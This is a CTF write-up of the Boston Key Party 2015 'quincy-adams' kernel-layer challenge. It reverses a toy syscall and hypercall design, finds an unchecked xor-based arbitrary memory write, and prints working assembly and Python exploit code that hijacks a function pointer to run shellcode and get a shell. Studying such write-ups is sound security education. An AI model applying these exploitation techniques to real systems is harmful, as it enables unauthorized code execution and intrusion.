---
title: '[bkpCTF-2015] quincy-adams (kspace) write-up'
author: PPP
layout: post
categories:
  - CTF
  - Write-Ups
date: 2015-03-07 13:37:01
---
**=== If you have any trouble with poor formatting here, you can read the original post at <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/" target="_blank">this blog</a> ===**

This is a write-up for **quincy-adams** challenge, which is the second part of 3-chained pwnable challenge from <a href="https://ctftime.org/event/163" target="_blank">Boston Key Party CTF</a> last weekend. You can read about the other parts here: <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1224" target="_blank">quincy-center</a>, <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1234" target="_blank">braintree</a>.

The binaries were packaged into a <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz" target="_blank">tar ball</a>.

> The MBTA wrote a cool system. It&#8217;s pretty bad though, sometimes the commands work, sometimes they don&#8217;t&#8230;  
> Exploit it. (kspace flag) 54.165.91.92 8899

The goal is to get &#8220;kspace&#8221; flag by exploiting the kernel space process.

&nbsp;

Before we dive in, let&#8217;s look at what is really going on.

We can think of each process (tz, kspace, uspace) as a separate privilege ring, as their name suggest.

  * **tz** (TrustZone?) &#8211; a &#8220;hypervisor&#8221; layer that implements the &#8220;hypercalls&#8221; (we haven&#8217;t really reversed this too much).
  * **kspace** &#8211; a kernel layer that implements the &#8220;syscalls&#8221;; it maintains the files array and performs the actual tasks such as listing files, removing files, sleeping, and cat&#8217;ing (open & read).
  * **uspace** &#8211; a user layer that implements the interface that the user interacts with; it parses the commands and calls the appropriate &#8220;syscalls&#8221;.

We would start from the **uspace** to get an arbitrary code execution on **uspace** process (as we did in previous write-up), then exploit the **kspace** to allow us to perform an attack against **tz**. Shared memory is arranged by **tz**, such that each layer will get its own memory &#8220;space&#8221; to pass the arguments to {sys, hyper}calls.

<div id="attachment_1942" style="width: 544px" class="wp-caption aligncenter">
  <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_0.png"><img class="wp-image-1942" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_0.png" alt="" width="534" height="393" /></a>
  
  <p class="wp-caption-text">
    kspace syscall_handler (sub_401180)
  </p>
</div>

&nbsp;

We can see that the syscall numbers, which is stored on **user_space[0]**, match with what we saw on **uspace**.

  * **do_ls** loops through the **file_array** list and prints out the name of the file.
  * **do_rm** finds the file in **file_array** with a given filename, and deletes it.
  * **do_create** adds a file into **file_array** up to 16 files. It looks for the spot/bin in the array by checking if the filename is null.  
    This also initializes the file structure:</p> 
      * **open_file**, **read_file**, and **delete_file** are the function pointers. 
        <div id="attachment_1943" style="width: 483px" class="wp-caption aligncenter">
          <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_1.png"><img class="wp-image-1943 " src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_1.png" alt="" width="473" height="226" /></a>
          
          <p class="wp-caption-text">
            file struct
          </p>
        </div></li> </ul> </li> 
        
          * Note that **syscall 95** and **99** are **sleep** and **exit**, respectively, which are not that interesting :p
          * **do_read** finds the file in **file_array** with a given filename, and if the file is &#8220;open&#8221;, its content is copied to the output buffer (2nd argument).
          * **do_open** finds the file in **file_array** with a given filename, and changes its open state. 
              * Only up to 9 files can be open simultaneously.</ul> 
        
        There is a bug with file creation and deletion, where the number of files in the list gets incremented when creating a file, but it does not get decremented when being deleted. Thus, we can only create up to 16 files and we can&#8217;t create any more file even if we delete some. This didn&#8217;t really affect the exploitation, however <img src="http://ppp.cylab.cmu.edu/wordpress/wp-includes/images/smilies/simple-smile.png" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />
        
        If you followed carefully, you&#8217;d have noticed that we didn&#8217;t go over the mysterious **syscall 92** (sub_402380).
        
        This operation, unlike other ones, does not process the user input/arguments here. Instead, it forwards these arguments to **tz** via the &#8220;hypercall&#8221;.
        
        <div id="attachment_1948" style="width: 526px" class="wp-caption aligncenter">
          <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_2.png"><img class="wp-image-1948 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_2.png" alt="" width="516" height="420" /></a>
          
          <p class="wp-caption-text">
            syscall 92 (kspace)
          </p>
        </div>
        
        &nbsp;
        
        To be more precise, the 3 arguments are stored starting at **kernel_space + 48**, and the hypercall takes 3 arguments of the **hypercall number (92)**, ****, and the **pointer to the arguments (kernel_space + 48)**.
        
        So what does this hypercall do? Let&#8217;s take a look at **tz** binary now.
        
        <div id="attachment_1949" style="width: 545px" class="wp-caption aligncenter">
          <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png"><img class="wp-image-1949 " src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" alt="" width="535" height="447" /></a>
          
          <p class="wp-caption-text">
            hypercall handler (tz)
          </p>
        </div>
        
        As we can see above, **sub_401560** is the hypercall 92 handler.  
        It doesn&#8217;t really do anything too fancy. The function performs a very simple &#8220;encryption&#8221; of data.
        
        <div id="attachment_1951" style="width: 491px" class="wp-caption aligncenter">
          <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_4.png"><img class="wp-image-1951 " src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_4.png" alt="" width="481" height="248" /></a>
          
          <p class="wp-caption-text">
            hypercall 92 handler
          </p>
        </div>
        
        &nbsp;
        
        It basically **xor**&#8216;s the bytes at **src** with the **key** &#8220;charlestown isn&#8217;t that skeytchy.&#8221; and stores the result to **dest**.
        
        There is no restriction on the memory address for **dest** (other than checking if it&#8217;s 0x100000000), which allows us to do <span style="text-decoration: underline;">arbitrary (xor) write</span>. By preparing the **src** buffer with already xor&#8217;d values, we can write any value we want to any memory location.
        
        So, we can use this capability(?) to write useful data structure (such as a function pointer) to gain arbitrary code execution!
        
        Just like **uspace**, **kspace** has NX disabled, so we can put our shellcode somewhere and jump to it.
        
        &nbsp;
        
        The attack plan is as follows:
        
          1. Create a file, with the content being the shellcode we want to run as kernel.
          2. Overwrite a function pointer (open_file) for the first file (which is the one that we just created in step 1) with the pointer to our shellcode. 
              * The **file_array** is located at kernel_space + 0x3E800 == **0x90003e800**.
              * According to our **struc_files** struct, file_array **+ 0x8** points to the **files** array.
              * Thus, the first file structure will be located at **0x90003e808** and according to our **struc_file**, its content is located at the offset **+0x9**.
              * The first file&#8217;s content == **shellcode** == 0x90003e800 + 0x8 + 0x9 == **0x90003e811**.
              * The first file&#8217;s **open_file** function pointer is at **+0x118** from the file structure, which makes its location **0x90003e920**.
          3. Invoke a syscall #93, which opens a file. 
              * At this point, we will tell it to open our file which has corrupted **open_file** function pointer &#8212; thus, calling into our shellcode.
        
        <pre class="whitespace-after:1 lang:asm decode:true" title="stage1.asm">[BITS 64]

section .text
global _start
_start:

; sem_lock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401A90
call rax

; syscall 92 (encrypt)
push qword [rel data]       ; 0x90003e811 (xor'd)
mov rax, [0x602498]         ; user_space
mov qword [rax], 92         ; syscall #92
mov qword [rax + 8], rsp    ; src (ptr to data)
mov rcx, [rel dst]          ;
mov qword [rax + 16], rcx   ; dst (0x90003e920)
mov qword [rax + 24], 0x8   ; len

; sem_unlock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401AC0
call rax

; sleep(1)
mov rdi, 1
mov rax, 0x400C30
call rax

; sem_lock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401A90
call rax

; syscall 93 (open)
push qword [rel data]       ; now has 0x90003e811
mov rax, [0x602498]         ; user_space
mov qword [rax], 93         ; syscall #93
lea rcx, [rax + 16]         ; (using user_space + 16 as scratch)
mov qword [rax + 8], rcx    ; filename
mov rcx, [rel lol]
mov qword [rax + 16], rcx   ; filename &lt;- &("lol")

; sem_unlock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401AC0
call rax

data:
dq 0x7473656572628072   ; 0x90003e811 ^ 0x7473656c72616863 (key)
dst:
dq 0x90003e920
lol:
db 'lol',0
</pre>
        
        Note that since we are using syscal #92 (encrypt) to perform an arbitrary write to memory, we have to &#8220;encrypt&#8221; the value we want to write beforehand such that it will get &#8220;decrypted&#8221; when it writes. The filename we used is &#8220;lol&#8221;.
        
        <pre class="whitespace-after:1 lang:python decode:true" title="pwn_kspace.py">#!/usr/bin/python
import struct

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]

f = open('payload', 'wb')

f.write('create lol\n'.ljust(0x400, '#'))
f.write(open('shell.bin').read().ljust(0x100, '\0'))

pop_pop_ret = 0x40110F
stage1 = open('stage1.bin').read()

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))
</pre>
        
        Our exploit code looks fairly similar, but we now create a file called &#8216;lol&#8217; first with the shellcode. (The shellcode is the same as what we used for uspace.)
        
        Then, we trigger the bug with our stage1 code.
        
        <pre class="nums:false whitespace-after:1 lang:sh decode:true" title="Pwn!">$ nasm shell.asm -f bin -o shell.bin
$ nasm stage1.asm -f bin -o stage1.bin
$ python pwn_kspace.py
$ (cat ../kspace/payload; cat -) | sudo ./tz
bksh&gt; bksh&gt; bksh&gt;
whoami
kspace</pre>
        
        &nbsp;
        
        So far, we have triggered a **uspace** bug to call a syscall (92) in **kspace**, which does a hypercall (92) in **tz**, which allowed us to perform an arbitrary memory write in **kspace **memory.
        
        Amusingly, we will be using the same primitive to get a shell under **tz** context in the next series.
        
        &nbsp;
        
        Write-up by Cai (Brian Pak) [https://www.bpak.org]
        
        &nbsp;